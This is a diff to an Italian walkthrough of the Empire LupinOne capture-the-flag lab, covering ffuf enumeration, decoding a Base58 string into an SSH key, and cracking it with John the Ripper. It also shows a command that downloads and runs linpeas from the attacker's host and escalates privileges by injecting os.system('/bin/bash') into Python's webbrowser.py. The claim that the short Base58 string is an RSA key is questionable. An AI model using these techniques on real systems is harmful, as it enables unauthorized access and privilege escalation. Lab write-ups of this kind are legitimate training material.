@@ -20,7 +20,7 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
 
 ### 2️⃣ **Enumeration**
 
-#### 🕵️‍♂️ Analisi del sito web
+#### 🧕️‍♂️ Analisi del sito web
 - Accesso alla porta 80 per esplorare il contenuto.
 - Individuazione di `/robots.txt` che suggerisce una directory nascosta: `/~myfiles`.
 
@@ -30,6 +30,13 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
   ffuf -u http://192.168.1.7/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -c
   ```
 - Directory scoperta: `/~secret`.
+
+#### 🔎 Analisi e scoperte aggiuntive
+- Nel sorgente della pagina `/~myfiles`, abbiamo trovato un commento motivazionale:
+  ```
+  <!-- you can do it, keep trying -->
+  ```
+  Questo suggerimento ci ha spinti a continuare l'enumerazione per trovare risorse nascoste.
 
 ---
 
@@ -41,7 +48,26 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
   ```bash
   ffuf -u http://192.168.1.7/~secret/.FUZZ -e .py,.java,.php,.dart,.rar,.zip,.txt,.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -c -ic -fc 403
   ```
-- File trovato: `victim_id_rsa`.
+- File trovato: `.mysecret.txt`.
+- Durante l'analisi di `/~secret`, abbiamo trovato un riferimento al nome utente `icex64`, che ci ha fornito un indizio cruciale per accedere successivamente al sistema.
+
+#### 🪦 Decodifica della chiave RSA
+- Contenuto del file `.mysecret.txt`:
+  ```text
+  5HueCGU8rMjxEXxiPuD5BDu3fjK4EM2sf57aXbVZ5q7Z3zKJMYp
+  ```
+- Dopo un'analisi del contenuto, abbiamo dedotto che si trattava di una **chiave RSA codificata in Base58**. Per decodificarla, abbiamo utilizzato un decoder online come [Browserling](https://www.browserling.com/tools/base58-decode) oppure uno script Python:
+  ```python
+  import base58
+
+  encoded_key = "5HueCGU8rMjxEXxiPuD5BDu3fjK4EM2sf57aXbVZ5q7Z3zKJMYp"
+  decoded_key = base58.b58decode(encoded_key).decode('utf-8')
+  print(decoded_key)
+  ```
+- Una volta decodificata, la chiave è stata salvata in un file chiamato `victim_id_rsa` con i permessi corretti:
+  ```bash
+  chmod 600 victim_id_rsa
+  ```
 
 #### 🛠️ Conversione e brute force della chiave SSH
 - Conversione della chiave per John the Ripper:
@@ -65,7 +91,7 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
 
 ### 4️⃣ **Privilege Escalation**
 
-#### 🧑‍💻 Verifica dei privilegi di `sudo`
+#### 🦑‍🔧 Verifica dei privilegi di `sudo`
 - Analisi dei permessi:
   ```bash
   sudo -l
@@ -75,18 +101,22 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
 #### 🔍 Analisi con linpeas
 - Esecuzione del tool:
   ```bash
-  wget 192.168.1.8/linpeas.sh
-  chmod +x linpeas.sh
-  ./linpeas.sh
+  python -m SimpleHTTPServer 80
   ```
-- Individuato file Python `webbrowser.py`:
-  ```bash
-  nano /usr/lib/python3.9/webbrowser.py
-  ```
-  - **Modifica**: aggiunta di `os.system("/bin/bash")`.
+  - Su Kali Linux, abbiamo avviato un server HTTP e trasferito `linpeas` alla macchina target:
+    ```bash
+    wget 192.168.1.3/linpeas.sh
+    chmod 777 linpeas.sh
+    ./linpeas.sh
+    ```
+- Abbiamo identificato la posizione del file Python `webbrowser.py`.
 
 #### 🐍 Escalation con script Python
-- Escalation dei privilegi:
+- Modifica di `webbrowser.py` per eseguire `/bin/bash`:
+  ```python
+  os.system("/bin/bash")
+  ```
+- Esecuzione del file modificato:
   ```bash
   sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
   ```
@@ -112,9 +142,9 @@ Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo docu
 
 ---
 
-## 🎯 **Conclusione**
+## 🌟 **Conclusione**
 
-Il CTF **Empire LupinOne** è stato completato con successo grazie alla sinergia del **TeamCyberCerberus**! 🔓 Questo walkthrough evidenzia l'importanza di strumenti come **nmap**, **FFUF**, **linpeas**, e tecniche di privilege escalation come **pip** e Python library hijacking. 💻
+Il CTF **Empire LupinOne** è stato completato con successo grazie alla sinergia del **TeamCyberCerberus**! 🔒 Questo walkthrough evidenzia l'importanza di strumenti come **nmap**, **FFUF**, **linpeas**, e tecniche di privilege escalation come **pip** e Python library hijacking. 💻
 
 Grazie per aver seguito questa guida e per il supporto al nostro team! 💪
 
